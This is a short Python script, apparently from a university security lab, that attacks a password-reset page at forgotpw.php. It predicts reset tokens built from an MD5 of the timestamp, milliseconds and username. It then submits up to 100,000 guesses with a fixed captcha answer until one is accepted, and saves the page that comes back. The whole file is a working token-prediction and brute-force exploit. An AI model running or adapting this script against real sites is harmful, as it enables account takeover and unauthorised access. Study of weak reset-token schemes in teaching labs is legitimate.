# desiged to cracking our own password with corrent timing 
import time
import requests
import hashlib
import random


def gen(dice):
	current = time.time() + 56 + random.uniform(-0.9,-0.3)
	current_int = int(current)
	token1 = str(current_int)
	#token2 = str(dice)
	token2 = str(int((current-current_int)*1000))
	token3 = 'DallaraWang'
	data = token1 + '::' + token2 + '::' + token3
#	print 'time here is: ', time.gmtime(current)


	m = hashlib.md5()
	m.update(data)
	data = m.digest()

	result = data.encode('base64')
	result = result.strip()
	return result



url = 'http://normandy-vm-04.cs.unc.edu/forgotpw.php?user=DallaraWang'
s = requests.Session()
count =0

for i in range(100000):
	
	r = None
	result = gen(0)
	pair = {'captcha_name':'974', 'captcha_solution':'GPS', 'token':result, 'submit':'Submit'}
	r = s.post(url, data = pair)

	resp = r.text
	count += 1
	if count%1000 == 0:
		print count,' has tried'

	if 'Wrong username or token' not in resp:
		print resp
		f = open('output','w')
		f.write(resp)
		f.close()
		exit(0)

	#print 'time here is: ', time.gmtime()[4],'min and ', time.gmtime()[5]
#	print 'remote time is ', r.headers['date']

#	if count ==5: exit(0)
	  		


